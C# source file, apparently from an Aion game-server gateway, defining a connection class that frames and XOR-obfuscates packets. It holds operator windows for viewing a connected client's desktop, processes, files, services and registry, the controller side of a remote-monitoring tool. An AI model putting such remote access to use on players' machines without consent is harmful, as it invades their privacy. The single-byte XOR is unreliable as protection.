using AionCommons.LogEngine;
using AionCommons.Network;
using AionCommons.Network.Packet;
using AionNetGate.Netwok.Server;
using AionNetGate.Services;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net.Sockets;
using System.Text;

namespace AionNetGate.Netwok
{
    public class AionConnection : Connection
    {
        private static readonly Logger log = LoggerFactory.getLogger();

        private Queue<AbstractServerPacket> sendMsgQueue;

        /// <summary>
        /// 计算机名
        /// </summary>
        internal string computerName;
        /// <summary>
        /// 显示桌面图片
        /// </summary>
        internal Image image;
        /// <summary>
        /// 查看电脑桌面
        /// </summary>
        internal DeskPictureForm deskForm;
        /// <summary>
        /// 查看进程窗口
        /// </summary>
        internal ProcessForm processForm;
        /// <summary>
        /// 查看详情窗口
        /// </summary>
        internal InfoForm infoForm;

        /// <summary>
        /// 浏览电脑窗口
        /// </summary>
        internal ExplorerForm explorerForm;

        /// <summary>
        /// 查看系统服务
        /// </summary>
        internal ServiceListForm serviceListForm;

        /// <summary>
        /// 查看注册表项
        /// </summary>
        internal RegeditForm regeditForm;

        /// <summary>
        /// 最后PING时间
        /// </summary>
        private long lastPing;

        internal AionConnection(Socket socket)
            : base(socket)
        {
            sendMsgQueue = new Queue<AbstractServerPacket>();
        }

        internal void onDisconnect()
        {
            sendMsgQueue = null;

            if (infoForm != null && !infoForm.IsDisposed)
                AionRoy.Invoke(infoForm, () => { infoForm.Text = string.Format("[{0}@{1}]当前客户机已断开连接", GetHashCode(), getIP()); });
            if (deskForm != null && !deskForm.IsDisposed)
                AionRoy.Invoke(deskForm, () => { deskForm.Text = string.Format("[{0}@{1}]当前客户机已断开连接", GetHashCode(), getIP()); });
            if (processForm != null && !processForm.IsDisposed)
                AionRoy.Invoke(processForm, () => { processForm.Text = string.Format("[{0}@{1}]当前客户机已断开连接", GetHashCode(), getIP()); });

            if ((explorerForm != null) && !explorerForm.IsDisposed)
                AionRoy.Invoke(explorerForm, () => { explorerForm.Text = string.Format("[{0}@{1}]当前客户机已断开连接", GetHashCode(), getIP()); });

            if ((serviceListForm != null) && !serviceListForm.IsDisposed)
                AionRoy.Invoke(serviceListForm, () => { serviceListForm.Text = string.Format("[{0}@{1}]当前客户机已断开连接", GetHashCode(), getIP()); });
            if ((regeditForm != null) && !regeditForm.IsDisposed)
                AionRoy.Invoke(regeditForm, () => { regeditForm.Text = string.Format("[{0}@{1}]当前客户机已断开连接", GetHashCode(), getIP()); });
            Close();
        }

        /// <summary>
        /// 将远程桌面窗口的内存地址赋值过来
        /// </summary>
        /// <param name="form"></param>
        internal void setDeskPictureForm(ref DeskPictureForm form)
        {
            deskForm = form;
        }
        /// <summary>
        /// 将进程窗口的内存地址赋值过来
        /// </summary>
        /// <param name="form"></param>
        internal void setProcessForm(ref ProcessForm form)
        {
            processForm = form;
        }
        /// <summary>
        /// 将详情窗口的内存地址赋值过来
        /// </summary>
        /// <param name="form"></param>
        internal void setInfoForm(ref InfoForm form)
        {
            infoForm = form;
        }

        /// <summary>
        /// 将浏览硬盘都窗口的内存地址赋值过来
        /// </summary>
        /// <param name="form"></param>
        internal void setExplorerForm(ref ExplorerForm form)
        {
            explorerForm = form;
        }
        /// <summary>
        /// 查看系统服务列表
        /// </summary>
        /// <param name="form"></param>
        internal void setServerListForm(ref ServiceListForm form)
        {
            serviceListForm = form;
        }
        /// <summary>
        /// 查看注册表
        /// </summary>
        /// <param name="form"></param>
        internal void setRegeditForm(ref RegeditForm form)
        {
            regeditForm = form;
        }
        /// <summary>
        /// 获取客户端连接IP
        /// </summary>
        /// <returns></returns>
        internal string getIP()
        {
            return GetIP();
        }

        /// <summary>
        /// 获取客户端连接端口
        /// </summary>
        /// <returns></returns>
        internal string getPort()
        {
            return GetPort();
        }
        /// <summary>
        /// 获取地理位置
        /// </summary>
        /// <returns></returns>
        internal string getLoction()
        {
            return GetLoction();
        }


        #region 处理CS封包
        /// <summary>
        /// 处理数据
        /// </summary>
        public override void ProcessData()
        {
            if (ReadInterestEnabled)
                return;
            lock (Buf)
            {
                ReadInterestEnabled = true;
                try
                {
                    // Read First Packet Size then go back at initial position.
                    int size = BitConverter.ToInt32(Buf.readByteArray(4), 0);
                    if (size <= 0 || size > 20000000) // 增加到20MB，支持大的桌面截图
                    {
                        log.warn("处理收到的客户端数据包有问题,已强行断开其连接!(理由：数据包无法识别,大小:" + size + ")");
                        isConnected = false;
                        onDisconnect();
                        return;
                    }
                    Buf.Position -= 4;
                    while (size > 0 && size <= (Buf.Length - Buf.Position))
                    {
                        Buf.Position += 4;
                        byte[] bs = Buf.readByteArray(size - 4);
                        byte opcode = bs[0];
                        if (!isConnected) //首次收到数据库
                        {
                            if (opcode == 0 && size < 300)//首个封包编号0 并且容量小于1024
                                isConnected = true;
                            else
                            {
                                log.warn("收到首个封包有问题,可能为攻击！");
                                isConnected = false;
                                onDisconnect();
                                return;
                            }
                        }
                        Type packetType = AionPackets.GetClientPacketType(opcode);
                        if (packetType == null)
                        {
                            log.warn("收到未知的客户端封包, 编号:0x" + opcode.ToString("X2") + " - 容量: " + (size - 4) + " - 数据: " + BitConverter.ToString(bs));
                        }
                        else
                        {
                            AbstractClientPacket pkt = (AbstractClientPacket)Activator.CreateInstance(packetType);
                            pkt.Write(bs, 1, bs.Length - 1);
                            pkt.Position = 0;

                            if (!Configs.Config.enable_socket_log)
                            {
                                if (opcode == 0)
                                    log.debug("接收封包[C]{0}:{1}({2})", GetIP().Equals("127.0.0.1") ? "" : GetIP(), pkt.GetType().Name, pkt.Length);
                            }
                            else
                            {
                                log.debug("接收封包[C]{0}:{1}({2})", GetIP().Equals("127.0.0.1") ? "" : GetIP(), pkt.GetType().Name, pkt.Length);
                            }

                            pkt.connection = this;
                            pkt.Opcode = opcode;
                            pkt.ProcessData();
                            pkt.Close();
                            pkt.Dispose();
                        }
                        if (Buf.Length - Buf.Position > 4)
                        {
                            size = BitConverter.ToInt32(Buf.readByteArray(4), 0);
                            Buf.Position -= 4;
                        }
                        else
                        {
                            size = 0;
                        }
                    }


                    int remaining = Buf.Length - Buf.Position;
                    if (remaining > 0)
                    {
                        //  log.debug("剩余字节 : " + (size - remaining));
                        // Read Latest Bytes
                        byte[] remdata = Buf.readByteArray(remaining);
                        Buf.Initialize();
                        Buf.writeByteArray(remdata);
                    }
                    else
                        Buf.Initialize();

                    ReadInterestEnabled = false;

                }
                catch (Exception e)
                {
                    ReadInterestEnabled = false;

                    if (Buf != null)
                        Buf.Initialize();

                    log.error("解析客户端数据包错误:{0}", e.ToString());

                    // 不要因为单个数据包错误就断开连接，而是继续处理
                    // 只有在严重错误时才断开连接
                    if (e is OutOfMemoryException || e is StackOverflowException)
                    {
                        log.error("严重错误，断开连接");
                        isConnected = false;
                        onDisconnect();
                    }
                }
            }
        }

        #endregion

        #region 发送SM封包 SendPacket

        /// <summary>
        /// 发送SM封包
        /// </summary>
        /// <param name="packet">SM包</param>
        internal void SendPacket(AbstractServerPacket packet)
        {
            if (sendMsgQueue == null)
                return;
            lock (sendMsgQueue)
            {
                sendMsgQueue.Enqueue(packet);
                if (!WriteInterestEnabled)
                    EnableWriteInterest();
            }
        }
        /// <summary>
        /// 发送SM包后关闭
        /// </summary>
        /// <param name="packet">SM包</param>
        /// <param name="closeAfterPacket">是否关闭</param>
        internal void SendPacket(AbstractServerPacket packet, bool closeAfterPacket)
        {
            SendPacket(packet);
            if (closeAfterPacket)
                SendPacket(null);
        }

        private void EnableWriteInterest()
        {
            WriteInterestEnabled = true;
            while (sendMsgQueue.Count > 0)
            {
                AbstractServerPacket pkt = sendMsgQueue.Dequeue();
                if (pkt == null)
                {
                    Close();
                    return;
                }
                BeginWrite(pkt);
            }
            WriteInterestEnabled = false;
        }

        /// <summary>
        /// 正式异步发SM封包
        /// </summary>
        /// <param name="packet"></param>
        internal void BeginWrite(AbstractServerPacket packet)
        {
            if (packet == null)
                return;
            if (!AionPackets.HasServerPacket(packet.GetType()))
            {
                log.warn("该封包的编号还未定义 " + packet.GetType().Name);
                return;
            }

            try
            {
                packet.Opcode = AionPackets.GetServerPacketOpcode(packet.GetType());
                int length = packet.ProcessData(this);
                // Send in socket
                ClientSocket.BeginSend(En(packet.ToArray(),length), 0, length, SocketFlags.None, new AsyncCallback(EndWrite), packet);
                if (!Ready)
                    Ready = true;
            }
            catch (Exception e)
            {
                MainService.Instance.RemoveConnect(this);
                if (!packet.GetType().Name.Equals("SM_PONG"))
                    log.error("发送SM封包失败:{0}", e.Message);
            }
        }

        private void EndWrite(IAsyncResult result)
        {
            if (ClientSocket != null && ClientSocket.Connected)
            {
                int sent = ClientSocket.EndSend(result);
                AbstractServerPacket pkt = (AbstractServerPacket)result.AsyncState;
                string packetName = pkt.GetType().Name;

                if (!Configs.Config.enable_socket_log)
                {
                    if (pkt.Opcode == 0)
                        log.debug("发送封包[S]{0}:{1}({2})", GetIP().Equals("127.0.0.1") ? "" : GetIP(), packetName, pkt.Length);
                    return;
                }

                if (!packetName.Equals("SM_PONG"))
                    log.debug("发送封包[S]{0}:{1}({2})", GetIP().Equals("127.0.0.1") ? "" : GetIP(), packetName, pkt.Length);
            }
        }
        #endregion



        internal void CheckPingTime()
        {
            SendPacket(new SM_PONG());
        }

        internal void setLastPing()
        {
            lastPing = currentTimeMillis();
        }
        internal long getLastPing()
        {
            return lastPing;
        }

        public static long currentTimeMillis()
        {
            return (long)DateTime.Now.Subtract(new DateTime(0x7b2, 1, 1, 0, 0, 0)).TotalMilliseconds;
        }

        private byte[] En(byte[] bs, int size)
        {
            byte[] newbyte = new byte[size];

            for (int i = 0; i < size; i++)
            {
                newbyte[i] = (byte)(bs[i] ^ "煌".ToCharArray()[0]);
            }
            bs = null;
            return newbyte;
        }
    }
}
